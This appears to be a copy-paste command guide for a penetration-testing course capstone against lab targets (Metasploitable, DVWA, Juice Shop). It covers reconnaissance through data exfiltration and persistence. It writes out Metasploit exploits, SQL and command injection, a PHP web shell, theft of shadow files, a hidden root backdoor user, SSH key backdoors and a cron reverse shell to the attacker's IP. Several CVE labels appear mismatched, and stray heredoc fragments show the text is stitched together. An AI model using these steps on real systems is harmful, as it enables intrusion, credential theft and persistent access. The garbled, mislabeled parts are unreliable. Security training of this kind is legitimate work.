# Capstone Project Quick Reference - Commands Guide
## All Commands for Each Phase (Copy & Paste Ready)

**Quick Access Commands by Phase:**
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Vulnerability Scanning](#phase-2-vulnerability-scanning)
- [Phase 3: Exploitation](#phase-3-exploitation)
- [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
- [Phase 5: Data Exfiltration](#phase-5-data-exfiltration)
- [Phase 6: Persistence](#phase-6-persistence)
- [Useful Utilities](#useful-utilities)
- [Reporting and Documentation](#reporting--documentation)

---

## PHASE 1: RECONNAISSANCE

### 1.1 Setup & Verification

```bash
# Create project directory
mkdir ~/capstone_project
cd ~/capstone_project
mkdir reconnaissance scanning exploitation privesc data_exfil reports

# Verify tools installed
msfconsole --version
nmap --version
curl --version

# Record date
echo "Project Started: $(date)" > project_log.txt
```

### 1.2 Network Discovery

```bash
# Discover devices on network
arp-scan --localnet > reconnaissance/arp_scan_results.txt

# Replace with your target IP (usually 192.168.x.x)
TARGET_IP="192.168.1.101"
ATTACKER_IP="192.168.1.100"
```

### 1.3 Basic Connectivity Tests

```bash
# Ping test (change IP as needed)
ping -c 3 192.168.1.101 > reconnaissance/ping_test.txt

# Traceroute test
traceroute 192.168.1.101 > reconnaissance/traceroute.txt

# DNS lookup
nslookup 192.168.1.101 > reconnaissance/dns_lookup.txt 2>&1
```

### 1.4 Web Reconnaissance (For Juice Shop)

```bash
# Grab web content
curl -s http://192.168.1.102:3000 | head -50 > reconnaissance/juice_web.txt

# Get HTTP headers
curl -I http://192.168.1.102:3000 > reconnaissance/http_headers.txt

# Try HTTPS
curl -k -I https://192.168.1.102:3000 > reconnaissance/https_headers.txt 2>&1
```

### 1.5 Comprehensive Port Scan

```bash
# Full port scan with service detection (CRITICAL - takes 15-30 min)
nmap -sV -sC -p- -O 192.168.1.101 > reconnaissance/full_port_scan.txt

# Faster scan (top 1000 ports)
nmap -sV -sC -O 192.168.1.101 > reconnaissance/quick_port_scan.txt

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.101 > reconnaissance/aggressive_scan.txt
```

### 1.6 Service Enumeration

```bash
# FTP enumeration
nmap -p 21 --script=ftp-anon,ftp-bounce 192.168.1.101 > reconnaissance/ftp_enum.txt

# SMB enumeration (Samba)
nmap -p 139,445 --script=smb-enum* 192.168.1.101 > reconnaissance/smb_enum.txt

# SSH enumeration
echo | nc -v 192.168.1.101 22 > reconnaissance/ssh_banner.txt

# HTTP enumeration
nmap -p 80 --script=http-enum,http-title 192.168.1.101 > reconnaissance/http_enum.txt

# MySQL check
nmap -p 3306 192.168.1.101 > reconnaissance/mysql_check.txt
```

### 1.7 Web Directory Brute Force

```bash
# Using dirb
dirb http://192.168.1.101 /usr/share/wordlists/dirb/common.txt -o reconnaissance/dirb_scan.txt

# Using gobuster (if installed)
gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt -o reconnaissance/gobuster.txt 2>/dev/null
```

---

## PHASE 2: VULNERABILITY SCANNING

### 2.1 Nessus Setup & Installation

```bash
# Check if installed
nessus --version

# If not installed, install:
cd ~/Downloads
sudo dpkg -i Nessus-10.*.deb

# Start service
sudo systemctl start nessusd
sudo systemctl enable nessusd

# Verify running
systemctl status nessusd
```

### 2.2 Start Nessus and Create Scans

```bash
# Open browser to:
# https://localhost:8834
# First access will prompt you to create admin account

# Via command line (if using Pro/Expert):
# nessus-cli

# Or build scan via API (advanced):
# curl -X POST https://localhost:8834/scans -d "..."
```

### 2.3 Export Nessus Results

```bash
# After scan completes, download from web interface
# File → Export → CSV or PDF format

# Save to:
# ~/capstone_project/scanning/metasploitable_nessus.pdf
# ~/capstone_project/scanning/metasploitable_nessus.csv

# If exported as CSV, parse results:
cd ~/capstone_project/scanning
grep "Critical\|High" metasploitable_nessus.csv > critical_vulns.csv
```

### 2.4 OWASP ZAP Web Scanning

```bash
# Install ZAP
sudo apt-get install zaproxy -y

# Run headless scan
zaproxy -cmd -quickurl http://192.168.1.102:3000 \
  -quickout ~/capstone_project/scanning/zap_report.html

# Or use GUI
zaproxy &
# Then configure scan in web interface
```

### 2.5 Vulnerability Parsing

```bash
# Extract critical vulnerabilities
echo "=== CRITICAL VULNERABILITIES ===" > scanning/vulns.txt
echo "Extracted: $(date)" >> scanning/vulns.txt

# Search OpenVAS or Nessus output for severity ratings
grep -i "severity.*critical" scanning/*.txt >> scanning/critical_list.txt
grep -i "severity.*high" scanning/*.txt >> scanning/high_list.txt
```

---

## PHASE 3: EXPLOITATION

### 3.1 Metasploit Foundation Setup

```bash
# Start metasploit console
msfconsole

# Update database (first time only)
# msfdb init
# (This happens automatically on Kali)

# In msfconsole (msfconsole> prompt):
help
search [keyword]
show options
info [exploit_name]
```

### 3.2 Samba Exploitation (CVE-2007-6015)

```bash
# In msfconsole:
search samba 3.0.20
use exploit/linux/samba/is_known_pipename

show options
# Output shows required options

# Set payload and options:
set RHOSTS 192.168.1.101
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# Check payload options
show payloads
show advanced

# Execute exploit
exploit

# Expected: [+] Exploit succeeded
# [*] Meterpreter session 1 opened
```

### 3.3 Meterpreter Commands (After Successful Exploit)

```bash
# In meterpreter> session:
whoami                    # Shows current user (should be root)
id                        # Shows UID/GID info
pwd                       # Current directory
uname -a                  # System information
hostname                  # System hostname
getuid                    # Get UID (Meterpreter command)
getsystem                 # Attempt to get system/root

# Take screenshot
screenshot

# Download files
download /etc/passwd ~/capstone_project/passwd.txt
download /etc/shadow ~/capstone_project/shadow.txt

# Upload files
upload ~/capstone_project/exploit.sh /tmp/exploit.sh

# Execute shell commands
shell
# Now in regular shell
$ ls -la /
$ cat /etc/passwd
$ exit  # Return to meterpreter
```

### 3.4 MySQL Exploitation

```bash
# From meterpreter shell
meterpreter > shell
$ mysql -h 192.168.1.101 -u root

# In MySQL prompt:
mysql> show databases;
mysql> use dvwa;
mysql> show tables;
mysql> select * from users;
mysql> select user, password from users;
mysql> exit;
$ exit  # Back to meterpreter
```

### 3.5 FTP Anonymous Access

```bash
# In meterpreter:
meterpreter > shell
$ ftp 192.168.1.101
ftp> anonymous
ftp> [no password needed]
ftp> ls
ftp> get [filename]
ftp> bye
$ exit
```

### 3.6 SSH Access Exploitation

```bash
# Try weak credentials
ssh msfadmin@192.168.1.101
# Password: msfadmin

# If successful:
$ whoami
$ id
$ pwd
$ exit  # Disconnect
```

### 3.7 DVWA Web App Exploitation

```bash
# Open browser to:
http://192.168.1.101/dvwa

# Login:
Username: admin
Password: password

# Navigate to SQL Injection
# Input: ' OR '1'='1
# Should return all records

# For command injection:
# Input: 192.168.1.1; id;
# Should execute: id command

# Create web shell:
# In command injection field:
# 192.168.1.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Access shell:
# http://192.168.1.101/shell.php?cmd=whoami
# http://192.168.1.101/shell.php?cmd=id
```

### 3.8 OWASP Juice Shop Exploitation

```bash
# Open browser to:
http://192.168.1.102:3000

# Try login bypass:
Username: admin@juice-sh.op
Password: admin123

# Or SQL injection:
Username: ' OR '1'='1' --
Password: anything

# Try NoSQL injection:
Username: admin
Password: {"$ne":null}

# Edit cookies and JWTs:
# Right-click → Inspect → Application/Storage → Cookies
# Look for tokens and try to modify them
```

---

## PHASE 4: PRIVILEGE ESCALATION

### 4.1 Kernel Exploit - sock_sendpage (CVE-2010-3904)

```bash
# From low-privilege shell on target
$ uname -a
# Should show: Linux ... 2.6.39 ...

# In msfconsole (background current session):
# [CTRL+Z] to background
background

# Create kernel exploit session:
use exploit/linux/local/sock_sendpage
set SESSION 1
set LHOST 192.168.1.100
set LPORT 5555

exploit

# Or manually download and compile:
$ cd /tmp
$ wget [exploit_url] 
$ gcc -o exploit exploit.c -w
$ ./exploit
# Should drop to root shell (#)
```

### 4.2 Sudo Misconfiguration Exploitation

```bash
# Check sudo privileges:
$ sudo -l

# If sees NOPASSWD for dangerous commands:
$ sudo find / -exec /bin/bash \; -quit

# Or using nmap (if vulnerable version):
$ sudo nmap --interactive
nmap> !sh
# Now root shell

# Or using other SUID commands:
$ sudo -l  # List what's available
$ sudo [command] -exec /bin/bash \;
```

### 4.3 SUID Binary Exploitation

```bash
# Find SUID binaries:
$ find / -perm -4000 2>/dev/null

# Check for vulnerabilities in each:
$ ls -la /usr/bin/[suid_binary]

# Try to exploit:
$ /usr/bin/[suid_binary] [payload]
```

### 4.4 Verify Root Access

```bash
# Proof of root access:
$ whoami
root

$ id
uid=0(root) gid=0(root) groups=0(root)

$ cat /etc/passwd
# Should be readable

$ cat /etc/shadow
# Should be readable (root-only file)

# Take screenshot for documentation
```

---

## PHASE 5: DATA EXFILTRATION

### 5.1 Identify Sensitive Data

```bash
# From root shell:
$ find / -name "*.conf" 2>/dev/null
$ find / -name "*.config" 2>/dev/null
$ find / -name "*password*" 2>/dev/null
$ find / -name "*credential*" 2>/dev/null

# Check important directories:
$ ls -la /etc/
$ ls -la /root/
$ ls -la /var/www/html/
$ ls -la /opt/

# Look for databases:
$ find / -name "*.sql" 2>/dev/null
$ find / -name "*.db" 2>/dev/null
```

### 5.2 Collect Data

```bash
# Create collection directory
$ mkdir /tmp/exfil
$ cd /tmp/exfil

# Copy sensitive files:
$ cp /etc/passwd .
$ cp /etc/shadow .
$ cp /etc/hosts .
$ cp -r /var/www/html .
$ cp /root/.bashrc .
$ cp /root/.bash_history .

# Check what we collected:
$ ls -la /tmp/exfil/
$ du -sh /tmp/exfil/
```

### 5.3 Create Archive

```bash
# Compress for transfer:
$ cd /tmp
$ tar -czf exfil_data.tar.gz exfil/

# Verify size:
$ ls -lh exfil_data.tar.gz
```

### 5.4 Download to Attacker

```bash
# In Meterpreter:
meterpreter > download /tmp/exfil_data.tar.gz ~/capstone_project/exfil_data.tar.gz

# Or via SCP:
$ scp root@192.168.1.101:/tmp/exfil_data.tar.gz ~/capstone_project/

# Or via HTTP:
# On target:
$ python3 -m http.server 8888 -d /tmp/exfil &

# On attacker:
$ wget http://192.168.1.101:8888/exfil_data.tar.gz
$ mkdir ~/capstone_project/exfil
$ tar -xzf exfil_data.tar.gz -C ~/capstone_project/
```

### 5.5 Examine Exfiltrated Data

```bash
# Extract
cd ~/capstone_project
tar -xzf exfil_data.tar.gz

# View sensitive files:
cat exfil/passwd
cat exfil/shadow
cat exfil/html/config.php
cat exfil/html/database.sql

# Count users:
wc -l exfil/passwd

# Search for passwords in configs:
grep -r "password" exfil/ 2>/dev/null
grep -r "credential" exfil/ 2>/dev/null
```

---

## PHASE 6: PERSISTENCE

### 6.1 Create Backdoor User

```bash
# On target (as root):
$ useradd -m -p $(openssl passwd -1 backdoor123) backdoor
$ echo "backdoor:0:0::/root:/bin/bash" >> /etc/passwd

# Verify:
$ su - backdoor
$ whoami

# Test from attacker:
$ ssh backdoor@192.168.1.101
# Password: backdoor123
```

### 6.2 Create Web Shell

```bash
# On target:
$ cat > /var/www/html/admin.php << 'EOF'
<?php
system($_GET['cmd']);
?>
EOF

$ chmod 644 /var/www/html/admin.php

# From attacker:
$ curl "http://192.168.1.101/admin.php?cmd=whoami"
# Output: root
```

### 6.3 Cron Job Persistence

```bash
# On target (as root):
$ crontab -e

# Add line:
* * * * * /bin/bash -i >& /dev/tcp/192.168.1.100/5555 0>&1

# Verify:
$ crontab -l

# Set up listener on attacker:
$ nc -lvnp 5555
# Now you get shell every minute
```

### 6.4 SSH Key Backdoor

```bash
# Generate keypair on attacker:
$ ssh-keygen -t rsa -N "" -f ~/.ssh/backdoor_rsa

# On target (as root):
$ mkdir -p /root/.ssh
$ cat ~/.ssh/backdoor_rsa.pub > /root/.ssh/authorized_keys
$ chmod 600 /root/.ssh/authorized_keys

# From attacker:
$ ssh -i ~/.ssh/backdoor_rsa root@192.168.1.101
# No password needed!
```

---

## USEFUL UTILITIES

### Nmap Cheat Sheet

```bash
# Service detection
nmap -sV 192.168.1.101

# OS detection
nmap -O 192.168.1.101

# All ports
nmap -p- 192.168.1.101

# Aggressive scan
nmap -A -T4 192.168.1.101

# Vuln scripts
nmap --script vuln 192.168.1.101

# Specific port
nmap -p 80 -sV 192.168.1.101

# UDP scan
nmap -sU -p- 192.168.1.101

# TCP SYN scan
nmap -sS 192.168.1.101

# Connect scan
nmap -sT 192.168.1.101
```

### File Transfer Methods

```bash
# SCP
scp file user@host:/path/
scp user@host:/file ~/

# FTP
ftp host
> get/put filename

# HTTP Server
python3 -m http.server 8000
wget http://host:8000/file

# Wget
wget http://host/file

# Curl
curl http://host/file > file

# Netcat
# Send: cat file | nc -l -p 1234
# Receive: nc host 1234 > file

# Base64 (for embedding)
cat file | base64
echo "[encoded]" | base64 -d > file
```

### Metasploit Quick Reference

```bash
# Start msfconsole
msfconsole

# Search for exploits
search [keyword]
search samba 3.0.20

# Use exploit
use exploit/path/to/exploit

# Show required options
show options

# Set options
set RHOSTS 192.168.1.101
set LHOST 192.168.1.100
set PAYLOAD [payload]

# Run exploit
exploit
run

# Background session
[CTRL+Z]
background

# View sessions
sessions

# Connect to session
sessions -i 1

# List payloads
show payloads
```

### Database Access

```bash
# MySQL
mysql -h 192.168.1.101 -u root
mysql -u root -p[password] [database]

# PostgreSQL
psql -h 192.168.1.101 -U postgres

# SQLite
sqlite3 /path/to/database.db

# Basic MySQL commands
SHOW DATABASES;
USE [database];
SHOW TABLES;
SELECT * FROM [table];
SELECT * FROM users;
```

### Password Cracking

```bash
# Hashcat
hashcat -a 0 -m 1800 shadow.txt wordlist.txt
hashcat -a 0 -m 500 hashes.txt wordlist.txt

# John the Ripper
john shadow.txt
john --wordlist=wordlist.txt hashes.txt

# Hydra (online brute force)
hydra -l admin -P wordlist.txt ssh://192.168.1.101
hydra -l admin -P wordlist.txt http-post-form://192.168.1.101:80/login.php
```

### Network Utilities

```bash
# Network info
ifconfig
ip addr show
netstat -tlnp
ss -tlnp

# DNS
nslookup host.com
dig host.com
host host.com

# Network connectivity
ping host
traceroute host
mtr host

# Port scanning
nc -zv host port
telnet host port
```

════════════════════════════════════════════════════════════

SUBMISSION CHECKLIST:

□ Executive Summary (PDF)
□ Technical Report (PDF)
□ Presentation Slides (8 slides PPTX)
□ Supporting Documentation (all included)
□ Evidence Files (screenshots, logs)
□ README.txt (this file)
□ All files in final_deliverables/ folder
□ README reviewed for accuracy
□ All deliverables verified present

════════════════════════════════════════════════════════════

QUESTIONS? REFER TO:

- Technical questions → Detailed Technical Report
- Findings overview → Executive Summary
- Visual presentation → Presentation Slides
- Detailed proof → Supporting Documentation
- Specific tool output → Evidence/Tool_Output/

════════════════════════════════════════════════════════════
EOF

cat ~/capstone_project/final_deliverables/README.txt
```

---

## CREATING YOUR FINAL DELIVERABLES

### Document Template: Executive Summary

Use this format for your report:

```
TITLE: Penetration Test Report - [Target Organization]
DATE: [Today]
ASSESSOR: [Your Name]

OVERALL RATING: CRITICAL

EXECUTIVE OVERVIEW:
[2-3 paragraphs summarizing findings]

KEY FINDINGS:
1. Critical Issue #1 (CVSS 9.8)
2. Critical Issue #2 (CVSS 9.1)
3. High Issue #1 (CVSS 7.5)

IMMEDIATE ACTIONS REQUIRED:
- Action 1 (within 24 hours)
- Action 2 (within 1 week)
- Action 3 (within 1 month)

ESTIMATED REMEDIATION: $X, Y weeks
```

### Presentation Template: 8 Slides

Ensure your presentation includes:
1. Title slide
2. Assessment scope/overview
3. Key findings (chart with numbers)
4. Exploitation success proof
5. Attack timeline  
6. Remediation roadmap
7. Business impact/ROI
8. Conclusions & recommendations

### Evidence Collection Checklist

For each vulnerability exploited, document:
- [ ] Screenshots of exploit execution
- [ ] Command-by-command walkthrough
- [ ] Expected vs. actual output
- [ ] Proof of access (whoami, id, etc.)
- [ ] Time to exploit
- [ ] Difficulty level assessment

---

## QUALITY CHECKLIST FOR FINAL SUBMISSION

```bash
cat > ~/capstone_project/SUBMISSION_CHECKLIST.txt << 'EOF'
═════════════════════════════════════════════════════════════
CAPSTONE PROJECT SUBMISSION CHECKLIST
═════════════════════════════════════════════════════════════

PHASE COMPLETENESS:
□ Phase 1: Reconnaissance (100%)
□ Phase 2: Vulnerability Scanning (100%)
□ Phase 3: Exploitation (100%)
□ Phase 4: Privilege Escalation (100%)
□ Phase 5: Data Exfiltration (100%)
□ Phase 6: Post-Exploitation (100%)
□ Phase 7: Reporting (100%)

DELIVERABLES QUALITY:
□ Executive Summary - Professional, clear, < 5 pages
□ Technical Report - Detailed, evidence-backed, > 20 pages
□ Presentation - 8 slides, visual, compelling
□ Documentation - Well-organized, easy to follow
□ Evidence - Screenshots, logs, proof included
□ README - Clear, guides reviewers through files

CONTENT ACCURACY:
□ All commands tested and working
□ All screenshots are real, not fabricated
□ All claims have evidence
□ CVSS scores verified
□ CVE numbers correct and current
□ Tool versions documented

PROFESSIONALISM:
□ No spelling/grammar errors
□ Consistent formatting
□ Professional tone throughout
□ Appropriate level of technical detail
□ Executive summary is non-technical
□ Technical report is detailed
□ Presentation is compelling

SUBMISSION STRUCTURE:
□ All files in final_deliverables/ folder
□ README.txt at root level
□ Subdirectories organized logically
□ No unnecessary files included
□ Total size < 500 MB
□ All PDFs properly formatted
□ PPTX presentation functions correctly

FINAL REVIEW:
□ Read through entire report
□ Check all links in PDF work
□ Verify all file paths correct
□ Test presentation on different computer
□ Peer review if possible
□ Spell-check all documents

═════════════════════════════════════════════════════════════

EXPECTED GRADING RUBRIC:

Depth of Analysis (25%):
□ Thorough reconnaissance
□ Complete vulnerability identification
□ Multiple exploitation paths
□ Detailed analysis of findings

Effectiveness of Exploits (25%):
□ Successfully exploited vulnerabilities
□ Proof of access documented
□ Multiple attack vectors demonstrated
□ Creative problem-solving shown

Problem-Solving Skills (20%):
□ Overcame obstacles
□ Adapted when tools failed
□ Alternative methods explored
□ Documented troubleshooting

Quality of Reporting (20%):
□ Clear, professional presentation
□ Evidence-backed findings
□ Business-appropriate language
□ Comprehensive documentation

Understanding of Concepts (10%):
□ Technical accuracy
□ Security concepts demonstrated
□ Knowledge applied correctly
□ Terminology used properly

═════════════════════════════════════════════════════════════
EOF

cat ~/capstone_project/SUBMISSION_CHECKLIST.txt
```

---

## TIMELINE SUMMARY

**Day 1-2: Reconnaissance**
- Passive information gathering
- Network mapping
- Port scanning
- Service enumeration
- Create reconnaissance report

**Day 2-3: Vulnerability Assessment**
- Run Nessus scans
- Analyze results
- Create vulnerability matrix
- Prioritize targets

**Day 3-4: Exploitation**
- Exploit Samba (CVE-2007-6015)
- Gain database access
- Exploit web applications
- Document each exploit

**Day 4-5: Privilege Escalation**
- Escalate from limited user to root
- Demonstrate kernel exploit
- Document proof of root access

**Day 5-6: Post-Exploitation**
- Exfiltrate sensitive data
- Establish persistence
- Create backdoor access
- Document impact

**Day 6-7: Reporting**
- Compile all findings
- Create executive summary
- Write technical report
- Prepare 8-slide presentation
- Organize all evidence

---

## CRITICAL SUCCESS FACTORS

✅ **Document Everything:**
- Every command executed
- Every screenshot taken
- Every finding recorded
- Every exploit proof collected

✅ **Stay Organized:**
- Create proper directory structure
- Name files clearly
- Keep detailed logs
- Reference artifacts consistently

✅ **Maintain Professional Standards:**
- Use proper formatting
- Write clearly and concisely
- Back up all claims with evidence
- Review for accuracy before submission

✅ **Time Management:**
- Don't spend too long on one task
- Move to next phase if stuck
- Document issues and try alternatives
- Keep to timeline

---

This comprehensive guide should help you complete the entire capstone project successfully. Good luck! 🛡️
EOF


---

**Pro Tip:** Keep this document open in a second terminal while working through phases. When you need a command, just search for the phase and copy it!
